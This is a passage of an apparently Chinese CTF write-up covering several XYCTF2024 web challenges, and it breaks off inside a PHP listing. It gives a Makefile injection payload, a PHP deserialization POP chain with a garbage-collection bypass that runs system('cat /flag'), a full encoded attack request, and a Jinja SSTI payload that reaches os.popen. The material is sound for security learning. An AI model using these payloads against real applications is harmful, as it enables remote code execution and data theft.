<figure class="highlight vbnet"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">make:</span> <span class="literal">Nothing</span> <span class="keyword">to</span> be done <span class="keyword">for</span> <span class="comment">&#x27;FLAG&#x27;.</span></span><br></pre></td></tr></table></figure>

<p>这个时候我们就要用到转义符号 $ ，这是因为在 Makefile 中， $ 符号是特殊字符，需要转义才</p>
<p>能正常使用，所以就得到了最终的payload</p>
<figure class="highlight gams"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">$</span><span class="symbol">$</span>(&lt;<span class="symbol">$</span>&lt;)</span><br></pre></td></tr></table></figure>

<p>有点神奇。。全程跟着wp做的，但还是得理解一下</p>
<p>从内到外去理解一下</p>
<p>首先需要理解的是重定向符</p>
<h3 id="重定向符"><a href="#重定向符" class="headerlink" title="重定向符&lt;"></a>重定向符<code>&lt;</code></h3><p>在 Shell（如 Bash）中，<code>&lt;</code> 是一个 <strong>输入重定向（Input Redirection）符号</strong>，用于 <strong>将文件内容作为命令的输入</strong>。</p>
<p>语法</p>
<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">命令 &lt; 文件</span><br></pre></td></tr></table></figure>

<p>那么&lt;$&lt; 回显了&lt;&#x2F;flag，此时根据这个特点，我们可以把flag文件的内容当成是命令的输入，然后我们需要解决如何输出这个命令或者是读取这个命令</p>
<h3 id=""><a href="#" class="headerlink" title="$(&lt;$&lt;)"></a>$(&lt;$&lt;)</h3><p><strong><code>$( &lt;$&lt; )</code></strong> → <strong>读取输入并执行命令</strong></p>
<p>在 Bash 中，<code>$( command )</code> 的语法是 <strong>命令替换（Command Substitution）</strong>，它的作用是：</p>
<ol>
<li><strong>执行 <code>command</code> 并捕获其标准输出（stdout）</strong>。</li>
<li><strong>将命令的输出结果替换到当前位置</strong>。</li>
</ol>
<p>例如我们本地测试一下</p>
<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">root</span>@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/var/www/html# cat <span class="number">1</span>.php</span><br><span class="line"><span class="attribute">123</span></span><br><span class="line"><span class="attribute">root</span>@VM-<span class="number">16</span>-<span class="number">12</span>-ubuntu:/var/www/html# $(&lt;<span class="number">1</span>.php)</span><br><span class="line"><span class="attribute">123</span>: command not found</span><br></pre></td></tr></table></figure>

<h3 id="最终payload"><a href="#最终payload" class="headerlink" title="最终payload"></a>最终payload</h3><p><code>$$(&lt;$&lt;)</code>：其实和上面的一样，只不过</p>
<p>在 Makefile 中：</p>
<ul>
<li><strong>单个 <code>$</code></strong> → 被 Make 解析（用于变量或自动化变量，如(CC)‘、‘(<em>CC</em>)‘、‘@&#96;）。</li>
<li><strong><code>$$</code></strong> → 转义为 <strong>单个 <code>$</code></strong> 并传递给 Shell（避免 Make 解析）。</li>
</ul>
<h2 id="ezPOP"><a href="#ezPOP" class="headerlink" title="ezPOP"></a>ezPOP</h2><h3 id="GC回收绕过"><a href="#GC回收绕过" class="headerlink" title="#GC回收绕过"></a>#GC回收绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 A &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$p</span> = <span class="variable language_">$this</span>-&gt;a;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;s-&gt;<span class="variable">$p</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 C &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$a</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;xy&#x27;</span>]);</span><br><span class="line">    <span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里的话链子还是很简单的</p>
<figure class="highlight livescript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CCC::__destruct<span class="function"><span class="params">()</span>-&gt;</span>AAA::__toString<span class="function"><span class="params">()</span>-&gt;</span>BBB::__get()</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//CCC::__destruct()-&gt;AAA::__toString()-&gt;BBB::__get()</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt; c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt; c -&gt; s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br></pre></td></tr></table></figure>

<p>重点在于get方法中的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$name</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;you get 2 B &lt;br&gt;&quot;</span>;</span><br><span class="line">        <span class="variable">$a</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line">        <span class="variable">$b</span>=<span class="variable">$_POST</span>;</span><br><span class="line">        <span class="variable">$c</span>=<span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="variable">$d</span>=<span class="variable language_">$this</span>-&gt;d;</span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>])) &#123;</span><br><span class="line">            <span class="keyword">unset</span>(<span class="variable">$b</span>[<span class="string">&#x27;a&#x27;</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里的话会检测是否有a参数并删除a参数，重点在于</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>, <span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br></pre></td></tr></table></figure>

<p>这里的话是一个动态函数调用链，先是调用函数 <code>$a</code>，并将 <code>$b</code> 作为参数传递，调用后还会对结果链式调用两次，这个动态调用还是第一次见，看wp后发现也是函数嵌套调用</p>
<p>用<code>implode</code>函数打，可以将数组连接成字符串，说白了就是占个位置，最终还是落实到最后的$c和$d去进行代码执行</p>
<p>先试一下</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;implode&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = [<span class="string">&quot;impl&quot;</span>,<span class="string">&quot;ode&quot;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">implode</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//implode</span></span><br></pre></td></tr></table></figure>

<p>然后我们构造一下payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="string">&quot;implode&quot;</span>;</span><br><span class="line"><span class="variable">$b</span> = [<span class="string">&quot;impl&quot;</span>,<span class="string">&quot;ode&quot;</span>];</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&quot;sys&quot;</span>, <span class="string">&quot;tem&quot;</span>);</span><br><span class="line"><span class="variable">$d</span> = <span class="string">&quot;whoami&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">call_user_func</span>(<span class="variable">$a</span>,<span class="variable">$b</span>)(<span class="variable">$c</span>)(<span class="variable">$d</span>);</span><br><span class="line"><span class="comment">//wanth3f1ag\23232</span></span><br></pre></td></tr></table></figure>

<p>成功执行了，然后我们试着写exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&quot;sys&quot;</span>, <span class="string">&quot;tem&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&quot;ls&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//CCC::__destruct()-&gt;AAA::__toString()-&gt;BBB::__get()</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt; c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt; c -&gt; s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$c</span>);</span><br><span class="line"><span class="comment">//O:3:&quot;CCC&quot;:1:&#123;s:1:&quot;c&quot;;O:3:&quot;AAA&quot;:2:&#123;s:1:&quot;s&quot;;O:3:&quot;BBB&quot;:2:&#123;s:1:&quot;c&quot;;a:2:&#123;i:0;s:3:&quot;sys&quot;;i:1;s:3:&quot;tem&quot;;&#125;s:1:&quot;d&quot;;s:2:&quot;ls&quot;;&#125;s:1:&quot;a&quot;;N;&#125;&#125;</span></span><br></pre></td></tr></table></figure>

<p>这里还需要注意一行代码</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>NewStar2023年的一道题也有，就是GC回收绕过</p>
<p><code>throw new Exception(&quot;noooooob!!!&quot;);</code> 是 PHP 中用于抛出异常的语句。它的作用是创建一个异常对象并将其抛出，通常用于在程序遇到错误或意外情况时中断正常流程，并将错误信息传递给调用者。</p>
<p>首先我们需要知道，在php中，当对象被销毁时会自动调用__destruct()方法，但如果程序报错或者抛出异常，就不会触发该魔术方法。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;yes&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;noooooob!!!&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>测试并没有输出yes，说明没触发该方法，这是因为throw函数自动回收了销毁的对象，导致destruct检测不到有东西销毁，从而导致无法触发魔术方法</p>
<p>所以我们可以通过提前触发垃圾回收机制来抛出异常，从而绕过GC回收，唤醒__destruct()魔术方法。</p>
<p>触发垃圾回收机制的方法有</p>
<ul>
<li>数组对象为NULL时，可以触发。</li>
<li>对象被unset()处理时，可以触发。</li>
</ul>
<p>所以我们这里可以用第一个方法，去构造数组对象并让数组对象为NULL</p>
<p>所以最后的exp</p>
<p>直接用array($c, null)得到一个数组,然后改成非法数组</p>
<p>本地测试debug一下</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250518215956707.png" alt="image-20250518215956707"></p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250518220028879.png" alt="image-20250518220028879"></p>
<p>发现可以绕过，直接打就行</p>
<p>exp</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">AAA</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$s</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">BBB</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span> = <span class="keyword">array</span>(<span class="string">&quot;sys&quot;</span>, <span class="string">&quot;tem&quot;</span>);</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$d</span> = <span class="string">&quot;cat /flag&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">CCC</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//CCC::__destruct()-&gt;AAA::__toString()-&gt;BBB::__get()</span></span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">CCC</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt; c = <span class="keyword">new</span> <span class="title function_ invoke__">AAA</span>();</span><br><span class="line"><span class="variable">$c</span>-&gt; c -&gt; s = <span class="keyword">new</span> <span class="title function_ invoke__">BBB</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="title function_ invoke__">serialize</span>(<span class="keyword">array</span>(<span class="variable">$c</span>,<span class="literal">null</span>));</span><br><span class="line"><span class="variable">$e</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;i:1;N;&quot;</span>,<span class="string">&quot;i:0;N;&quot;</span>,<span class="variable">$d</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="variable">$e</span>);</span><br></pre></td></tr></table></figure>

<figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">GET</span>:</span><br><span class="line"><span class="attribute">xy</span>=a%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>CCC%<span class="number">22</span>%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>c%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>AAA%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>s%<span class="number">22</span>%<span class="number">3</span>BO%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>BBB%<span class="number">22</span>%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bs%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>c%<span class="number">22</span>%<span class="number">3</span>Ba%<span class="number">3</span>A2%<span class="number">3</span>A%<span class="number">7</span>Bi%<span class="number">3</span>A0%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>sys%<span class="number">22</span>%<span class="number">3</span>Bi%<span class="number">3</span>A1%<span class="number">3</span>Bs%<span class="number">3</span>A3%<span class="number">3</span>A%<span class="number">22</span>tem%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>d%<span class="number">22</span>%<span class="number">3</span>Bs%<span class="number">3</span>A9%<span class="number">3</span>A%<span class="number">22</span>cat+%<span class="number">2</span>Fflag%<span class="number">22</span>%<span class="number">3</span>B%<span class="number">7</span>Ds%<span class="number">3</span>A1%<span class="number">3</span>A%<span class="number">22</span>a%<span class="number">22</span>%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D%<span class="number">7</span>Di%<span class="number">3</span>A0%<span class="number">3</span>BN%<span class="number">3</span>B%<span class="number">7</span>D</span><br><span class="line"><span class="attribute">POST</span>:</span><br><span class="line"><span class="attribute">a</span>=implode&amp;<span class="number">1</span>=impl&amp;<span class="number">2</span>=ode</span><br></pre></td></tr></table></figure>

<h2 id="我是一个复读机"><a href="#我是一个复读机" class="headerlink" title="我是一个复读机"></a>我是一个复读机</h2><h3 id="SSTI"><a href="#SSTI" class="headerlink" title="#SSTI"></a>#SSTI</h3><p>有个弱口令的字典，下下来吧</p>
<p>这个字典爆的有点久，然后爆破密码为asdqwe</p>
<p>登录进去就是一个界面</p>
<p><img src="/../image/achieve/202411/XYCTF2024/image-20250518221820810.png" alt="image-20250518221820810"></p>
<p>过滤了flag,也过滤了<code>&#123;&#125;</code></p>
<p>测试之后发现存在xss，传入中文后出现<code>我只能看懂你说的英文(＞﹏＜)&#123;&#125;</code>后面有括号，猜测可以通过报错把ssti的结果爆出来</p>
<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">一8<span class="number">*8</span>一</span><br></pre></td></tr></table></figure>

<p>出现回显64，可以确认为打jinja的ssti</p>
<p>测试之后发现过滤了<code>&quot; , &#39; [ ] flag _ os </code>，直接打request外带吧这样快一些</p>
<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?sentence=一(lipsum|attr(request.<span class="keyword">values</span>.a)).<span class="keyword">get</span>(request.<span class="keyword">values</span>.b).popen(request.<span class="keyword">values</span>.c).<span class="keyword">read</span>()一&amp;a=__globals__&amp;b=os&amp;c=cat%<span class="number">20</span>/flag</span><br></pre></td></tr></table></figure>

<h2 id="ezSerialize"><a href="#ezSerialize" class="headerlink" title="ezSerialize"></a>ezSerialize</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><h3 id="指针绕过"><a href="#指针绕过" class="headerlink" title="#指针绕过"></a>#指针绕过</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">include</span> <span class="string">&#x27;flag.php&#x27;</span>;</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$a</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$b</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;token === <span class="variable language_">$this</span>-&gt;password;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$pop</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;pop&#x27;</span>]);</span><br><span class="line">    <span class="variable">$pop</span>-&gt;token=<span class="title function_ invoke__">md5</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$pop</span>-&gt;<span class="title function_ invoke__">login</span>()) &#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">    